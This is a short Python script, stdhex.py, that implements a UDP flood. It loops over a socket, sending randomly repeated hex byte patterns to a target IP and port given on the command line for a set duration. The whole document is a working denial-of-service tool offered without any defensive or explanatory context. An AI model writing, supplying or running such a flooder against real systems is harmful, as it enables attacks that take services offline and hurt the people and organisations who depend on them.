# stdhex.py
import socket
import random
import sys
import time

def stdhex_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    hex_patterns = [
        b'\xde\xad\xbe\xef\xc0\xff\xee\x00',
        b'\xba\xad\xf0\x0d\x0d\x15\xea\x5e',
        b'\xfa\xce\xb0\x0c\xca\xfe\xba\xbe',
        b'\xde\xad\xc0\xde\xf0\x0d\xba\xbe',
        b'\x00\x11\x22\x33\x44\x55\x66\x77',
        b'\x88\x99\xaa\xbb\xcc\xdd\xee\xff',
        b'\x01\x23\x45\x67\x89\xab\xcd\xef',
        b'\xfe\xdc\xba\x98\x76\x54\x32\x10'
    ]
    
    timeout = time.time() + duration
    while time.time() < timeout:
        data = random.choice(hex_patterns) * random.randint(10, 100)
        sock.sendto(data, (target_ip, target_port))
    
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        sys.exit(1)
    stdhex_flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
